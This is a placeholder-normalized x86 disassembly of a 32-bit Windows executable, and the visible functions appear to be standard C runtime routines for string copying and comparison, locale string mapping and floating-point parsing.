mov esi [ esi + 0x8 ]
mov eax [ rw-data ]
cmp esi [ eax + 0x8 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
push esi
call sub_4b66ed
pop ecx
sub_4bc44e
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0xc ]
je r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x10 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x14 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x18 ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x18 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x1c ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x1c ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov eax [ esi + 0x20 ]
mov ecx [ rw-data ]
cmp eax [ ecx + 0x20 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
mov esi [ esi + 0x24 ]
mov eax [ rw-data ]
cmp esi [ eax + 0x24 ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4b66ed
pop ecx
push esi
call sub_4b66ed
pop ecx
sub_4bc530
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_4bc580
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_4bc6b0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
add esi 0x1
add edi 0x1
sub eax 0x1
je r-xdata
mov eax 0x0
sub eax 0x1
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
sub eax 0x1
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
sub eax 0x1
sub_4bc770
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_4bc7b0
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call eax
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x4
jb r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x2
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp + 0x12 ] 0x4
jmp r-xdata
or [ ebp + 0x12 ] 0x20
jmp r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
push ebx
call eax
mov ebx eax
push r--data
push edi
call esi
mov [ rw-data ] eax
sub_4bc8a9
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
xor eax eax
inc eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + r--data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_4bc8eb
mov ecx [ rw-data ]
mov eax edx
push edi
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
pop edi
jae r-xdata
lea edi [ ecx + ecx * 2 ]
add eax 0xc
lea edi [ edx + edi * 4 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] esi
je r-xdata
cmp [ eax + 0x4 ] esi
je r-xdata
retn
sub_4bc919
push 0x20
push r--data
call sub_4b8944
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
dec eax
dec eax
je r-xdata
mov esi rw-data
mov edi [ rw-data ]
dec eax
dec eax
je r-xdata
xor eax eax
cmp edi ecx
jne r-xdata
call sub_4b7c13
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov edx [ ebx + 0x54 ]
mov esi [ ebp + 0x8 ]
call sub_4bc8eb
mov esi eax
add esi 0x8
mov edi [ esi ]
xor ecx ecx
jmp r-xdata
sub eax 0x4
je r-xdata
cmp [ ebp - 0x1c ] ecx
je r-xdata
push 0x3
call sub_4b87b1
mov [ ebp - 0x20 ] edi
cmp edi 0x1
je r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
push ecx
call sub_4b80da
pop ecx
xor ecx ecx
sub eax 0x4
je r-xdata
mov edx [ ebx + 0x58 ]
mov [ ebp - 0x28 ] edx
mov [ ebx + 0x58 ] ecx
cmp eax 0x8
jne r-xdata
cmp eax 0xb
je r-xdata
mov esi rw-data
mov edi [ rw-data ]
jmp r-xdata
sub eax 0x6
je r-xdata
mov [ esi ] ecx
mov edx [ ebx + 0x5c ]
mov [ ebp - 0x2c ] edx
mov [ ebx + 0x5c ] 0x8c
cmp eax 0x4
jne r-xdata
mov [ ebp - 0x1c ] 0x1
mov ebx [ ebp - 0x24 ]
mov esi rw-data
mov edi [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call edi
push [ ebx + 0x5c ]
push 0x8
call edi
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x8
jne r-xdata
mov esi rw-data
mov edi [ rw-data ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0x58 ] ecx
cmp eax 0x8
jne r-xdata
cmp eax 0xb
je r-xdata
pop ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x8
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4bca54
cmp [ ebp + 0x8 ] 0x8
jne r-xdata
lea edx [ eax + eax * 2 ]
mov esi [ ebx + 0x54 ]
mov [ esi + edx * 4 + 0x8 ] ecx
inc eax
jmp r-xdata
call sub_4b897f
retn
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x5c ] eax
cmp eax 0x4
jne r-xdata
mov [ ebp - 0x30 ] eax
mov edx [ rw-data ]
mov esi [ rw-data ]
add edx esi
cmp eax edx
jge r-xdata
sub_4bca92
push 0x38
push r--data
call sub_4b8944
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor esi esi
inc esi
push esi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov [ ebp - 0x34 ] ebx
xor edi edi
mov [ ebp - 0x38 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
or eax 0xffffffff
sub eax ecx
add [ ebp + 0x14 ] eax
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_4bdc56
pop ecx
mov [ ebp - 0x3c ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x54 ]
call sub_4b897f
retn
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_4bdc9f
add esp 0x18
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x2c ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax esi
push [ ebp - 0x34 ]
call sub_4b66ed
pop ecx
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
mov [ ebp - 0x40 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] ebx
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x44 ] edi
push esi
push ebx
push edi
call sub_4ba340
add esp 0xc
jmp r-xdata
push esi
push [ ebp - 0x2c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ esi + esi ]
push eax
call sub_4b66db
pop ecx
mov [ ebp - 0x2c ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x34 ] ebx
je r-xdata
push edi
call sub_4b66ed
pop ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push ebx
push ebx
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x20 ] 0x1
push [ ebp - 0x40 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0x34 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x40 ]
call sub_4b66db
pop ecx
mov edi eax
cmp edi ebx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x30 ]
call sub_4b66ed
pop ecx
test [ ebp + 0xd ] 0x4
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x3c ]
call sub_4bdc9f
add esp 0x18
mov esi eax
neg esi
sbb esi esi
neg esi
jmp r-xdata
xor esi esi
jmp r-xdata
push [ ebp - 0x40 ]
push ebx
push edi
call sub_4ba340
add esp 0xc
mov [ ebp - 0x38 ] 0x1
mov eax edi
jmp r-xdata
push [ ebp - 0x2c ]
call sub_4b66ed
pop ecx
mov [ ebp - 0x4 ] 0x2
lea eax [ edi + edi ]
add eax 0x3
and eax 0xfffffffc
call sub_4b6180
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x30 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x30 ] ebx
jne r-xdata
cmp edi [ ebp + 0x1c ]
jg r-xdata
push edi
push [ ebp - 0x30 ]
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ edi + edi ]
push eax
call sub_4b66db
pop ecx
mov [ ebp - 0x30 ] eax
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp - 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
jmp r-xdata
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
push edi
push [ ebp - 0x30 ]
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
sub_4bce4e
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
lea ecx [ edx + esi ]
xor eax eax
cmp ecx edx
jb r-xdata
xor eax eax
inc eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
mov [ edx ] ecx
pop esi
retn
sub_4bce6f
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_4bce4e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_4bce4e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_4bce4e
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_4bce4e
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_4bcecd
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
mov ecx esi
add esi esi
push edi
mov edi [ eax + 0x4 ]
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_4bcefb
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
mov edi ecx
mov esi edx
shr ecx 0x1
shl esi 0x1f
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
or ecx edi
shr edx 0x1
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_4bcf28
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp eax edx
push esi
push edi
mov [ ebp - 0x8 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov esi 0x8000
jmp r-xdata
mov edi [ ebx + 0x8 ]
mov esi ebx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_4bcecd
push ebx
call sub_4bcecd
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_4bce6f
push ebx
call sub_4bcecd
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_4bce6f
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
test [ ebx + 0x8 ] esi
je r-xdata
mov ecx [ ebx + 0x4 ]
add [ ebp - 0x8 ] 0xfff0
mov eax ecx
shr eax 0x10
mov edi eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
cmp edi edx
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
je r-xdata
mov [ ebx + 0x8 ] edi
push ebx
call sub_4bcecd
add [ ebp - 0x8 ] 0xffff
pop ecx
mov ecx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
call sub_4bb8c9
leave
retn
sub_4bd00c
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
lea esi [ ebp - 0x58 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_4bd416 ]
jmp r-xdata
cmp bl 0x31
jl r-xdata
xor eax eax
inc eax
cmp bl 0x31
mov [ ebp - 0x14 ] eax
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x28 ] eax
jne r-xdata
movzx eax bl
push eax
mov [ ebp - 0x28 ] 0x1
call sub_4bb227
test eax eax
pop ecx
je r-xdata
cmp bl 0x31
lea ecx [ edi - 0x2 ]
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x24 ] 0x1
xor esi esi
jmp r-xdata
mov [ ebp - 0x8 ] esi
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
movzx eax bl
push eax
call sub_4bb227
test eax eax
pop ecx
jne r-xdata
movzx eax bl
push eax
call sub_4bb227
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
pop eax
dec edi
movsx eax bl
sub eax 0x2b
lea ecx [ edi - 0x1 ]
mov [ ebp + 0x10 ] ecx
je r-xdata
movzx eax bl
push eax
call sub_4bb227
test eax eax
pop ecx
jne r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0xc ] eax
jbe r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
cmp bl 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp [ ebp - 0xc ] 0x19
jae r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0xc ] 0x19
jae r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
je r-xdata
pop eax
dec edi
jmp r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
mov bl [ edi ]
inc edi
cmp bl 0x31
jl r-xdata
push 0x8
jmp r-xdata
dec eax
dec eax
jne r-xdata
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
jmp r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
cmp [ ebp - 0x41 ] 0x5
jl r-xdata
and [ ebp - 0x2c ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
xor eax eax
inc eax
jmp r-xdata
inc [ ebp - 0x10 ]
inc [ ebp - 0xc ]
sub bl 0x30
mov [ esi ] bl
inc esi
jmp r-xdata
jmp r-xdata
mov bl [ edi ]
inc edi
inc [ ebp - 0xc ]
sub bl 0x30
mov [ esi ] bl
inc esi
dec [ ebp - 0x10 ]
cmp bl 0x2d
je r-xdata
dec [ ebp - 0x10 ]
mov bl [ edi ]
inc edi
jmp r-xdata
or [ ebp - 0x1c ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
dec edi
cmp bl 0x39
jle r-xdata
mov [ ebp - 0x8 ] esi
mov edi ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
mov [ ebp - 0x20 ] esi
movzx eax bl
jmp r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
inc [ ebp - 0x41 ]
push 0x2
pop eax
mov [ ebp - 0x2c ] 0x8000
jmp r-xdata
sub eax 0x3
je r-xdata
cmp bl 0x30
je r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] edi
je r-xdata
push eax
call sub_4bb227
test eax eax
pop ecx
jne r-xdata
dec esi
cmp [ esi ] 0x0
je r-xdata
mov [ ebp - 0x8 ] esi
dec edi
jmp r-xdata
cmp bl 0x43
jle r-xdata
mov al [ edi ]
inc edi
movzx eax al
mov esi [ ebp - 0x8 ]
dec edi
jmp r-xdata
dec [ ebp - 0xc ]
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x58 ]
push eax
call sub_4bcf28
mov eax [ ebp - 0x20 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x1c ] ecx
jge r-xdata
cmp bl 0x45
jle r-xdata
add eax [ ebp - 0x10 ]
cmp [ ebp - 0x24 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp [ ebp - 0x28 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x2c ]
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0x6 ] esi
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x18 ]
mov [ ecx ] dx
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_4bb8c9
leave
retn
mov [ ebp - 0x18 ] 0x1
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_4be2ae
mov edx [ ebp - 0x3c ]
mov ebx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
mov eax [ ebp - 0x32 ]
add esp 0xc
jmp r-xdata
sub_4bd446
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x24 ] 0xcc
mov [ ebp - 0x23 ] 0xcc
mov [ ebp - 0x22 ] 0xcc
mov [ ebp - 0x21 ] 0xcc
mov [ ebp - 0x20 ] 0xcc
mov [ ebp - 0x1f ] 0xcc
mov [ ebp - 0x1e ] 0xcc
mov [ ebp - 0x1d ] 0xcc
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xfb
mov [ ebp - 0x19 ] 0x3f
mov [ ebp - 0x8 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
